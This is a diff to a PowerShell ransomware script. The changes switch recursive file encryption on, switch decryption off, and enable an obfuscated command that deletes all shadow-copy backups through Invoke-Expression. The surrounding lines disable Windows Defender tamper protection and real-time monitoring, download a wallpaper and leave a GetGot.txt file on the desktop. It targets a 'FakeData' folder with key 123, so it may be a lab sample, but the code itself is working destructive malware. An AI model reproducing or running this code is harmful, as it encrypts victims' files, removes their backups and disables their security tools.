@@ -112,9 +112,9 @@ function main{
     Invoke-WebRequest -Uri 'https://i.imgflip.com/a4oy3p.jpg' -OutFile "$env:USERPROFILE\Downloads\Wallpaper.jpg"
     $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
     foreach($file in $Target){
-        #Encrypt-File -FilePath $File -EncryptionKey $EncKey
+        Encrypt-File -FilePath $File -EncryptionKey $EncKey
         #Rename-Item -Path $file -NewName $file+".vlad" -Force
-        Decrypt-File -FilePath $file -EncryptionKey $EncKey
+        #Decrypt-File -FilePath $file -EncryptionKey $EncKey
     }
     try {
         New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File -ErrorAction Stop
@@ -134,10 +134,10 @@ Set-MPPreference -DisableTamperProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 
 $path = "$env:USERPROFILE\Desktop\FakeData"
-#$AS = "vssadmi"
-#$AZ = "n.exe delete shadows /all /quiet"
-#$AD = $AS + $AZ
-#Invoke-Expression $AD
+$AS = "vssadmi"
+$AZ = "n.exe delete shadows /all /quiet"
+$AD = $AS + $AZ
+Invoke-Expression $AD
 main -TargetDirectory $path -EncKey 123 
 
 Rundll32.exe user32.dll,UpdatePerUserSystemParameters
